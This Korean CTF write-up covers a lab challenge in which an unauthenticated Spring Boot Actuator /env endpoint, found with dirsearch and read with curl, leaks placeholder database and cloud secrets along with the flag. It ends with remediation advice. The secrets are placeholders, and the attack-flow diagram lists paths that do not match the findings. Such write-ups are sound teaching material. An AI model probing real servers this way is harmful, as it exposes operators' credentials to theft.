+++
title = "VulnABLE CTF [LUXORA] Write-up: Info Disclosure 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Info Disclosure", "Gold", "Debug Endpoints", "Spring Actuator", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Info Disclosure 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Crypto & Secrets Layer (Information Disclosure)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/info-disc/gold`
- **목표**: 프레임워크(Spring Boot 등)가 애플리케이션 모니터링을 위해 기본적으로 열어두는 디버그 엔드포인트(Debug Endpoints)를 찾아내어, 서버의 메모리에 캐싱된 환경변수(Env)와 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 타겟 분석 (Reconnaissance)

`/info-disc/gold` 경로 자체는 정상적인 사용자 프로필 화면을 보여줍니다.
하지만 백엔드 서버가 Java Spring Boot로 구동 중이라는 정보(서버 응답 헤더 `X-Powered-By: Spring Boot` 등)를 확인했다고 가정합시다.

**[해커의 사고 과정]**
1. 최신 백엔드 프레임워크들은 서버의 상태(CPU, 메모리, DB 연결 상태)를 모니터링하기 위해 내장된 디버그 API를 제공한다.
2. Spring Boot의 경우 **Spring Boot Actuator** 가 대표적이며, 주로 `/actuator`, `/manage`, `/monitor` 등의 경로를 사용한다.
3. Python Flask나 Django의 경우 Werkzeug 디버그 콘솔(`/console`)을 열어두는 실수를 종종 한다.
4. 이 기본 경로들이 외부 인터넷에 그대로 노출되어 있는지 브루트포싱 해보자!

---

## 💥 2. 취약점 식별 및 엔드포인트 탐색 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Directory Brute Force)--> [ Web Server ]
                                          |-- /config.php.bak
                                          |-- /.git/
                                          |-- Returns Sensitive Files
```


`dirsearch` 나 Burp Suite를 통해 널리 알려진 디버깅 경로를 스캔합니다.

### 💡 스캐닝 및 엔드포인트 발견
```bash
$ dirsearch -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt
```

**[검색 결과]**
```text
/actuator           (Status: 200)
/actuator/health    (Status: 200)
/actuator/env       (Status: 200)  <-- 타겟 발견!
```

---

## 🚀 3. 공격 수행 및 메모리(환경 변수) 탈취

Spring Boot Actuator의 `/env` 엔드포인트는 서버가 시작될 때 읽어 들인 모든 환경 변수(Environment Variables)와 시스템 설정값을 JSON 형태로 반환합니다.

### 💡 API 직접 호출
브라우저나 cURL을 이용하여 해당 엔드포인트에 GET 요청을 보냅니다.

```bash
$ curl -s http://localhost:3000/actuator/env | jq
```

### 🔍 서버의 응답
서버는 아무런 인증(Authentication) 과정 없이, 데이터베이스 비밀번호, 외부 API 연동 키, 그리고 클라우드 자격 증명까지 모든 민감한 설정값을 토해냅니다.

```json
{
  "activeProfiles": ["production"],
  "propertySources": [
    {
      "name": "systemEnvironment",
      "properties": {
        "DB_PASSWORD": {
          "value": "ProdDbMasterKey2023!"
        },
        "AWS_SECRET_ACCESS_KEY": {
          "value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        },
        "SECRET_FLAG": {
          "value": "FLAG{INFO_🥇_ACTUATOR_ENV_LEAK_G7H8I9}"
        }
      }
    }
  ]
}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

개발 및 운영 편의를 위해 제공되는 프레임워크의 내장 모니터링 툴(Actuator)이 적절한 접근 제어 없이 노출되었을 때, 전체 시스템이 해킹당하는 가장 흔하고 치명적인 설정 오류(Misconfiguration)를 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{INFO_🥇_ACTUATOR_ENV_LEAK_G7H8I9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프레임워크의 편리한 기능들을 활성화할 때, 그 엔드포인트들이 외부(Public Internet)에 같이 노출된다는 사실을 개발자가 인지하지 못한 것이 원인입니다.

* **안전한 패치 가이드 (엔드포인트 노출 최소화 및 인증)**
1. **불필요한 엔드포인트 비활성화**: Spring Boot `application.properties` 에서 모니터링에 꼭 필요한 기능(예: `health`, `info`)만 노출하고, `env`, `heapdump`, `threaddump` 처럼 민감한 정보를 담은 엔드포인트는 명시적으로 닫아야 합니다.
   ```properties
   # 안전한 Actuator 설정
   management.endpoints.web.exposure.include=health,info
   # env 노출 금지
   management.endpoint.env.enabled=false
   ```
2. **시큐리티(Security) 연동**: 만약 `env` 기능이 꼭 필요하다면, Spring Security를 연동하여 해당 URL(`/actuator/**`)에 접근할 때는 반드시 관리자 계정의 ID/PW 기반 인증(Basic Auth)이나 토큰(JWT) 검증을 거치도록 해야 합니다.
3. **내부망/포트 분리**: 모니터링용 API 포트를 애플리케이션 포트(예: 8080)와 분리하여, 로컬호스트나 내부 사설망(VPN)에서만 접근 가능하게 네트워크 방화벽을 쳐야 합니다.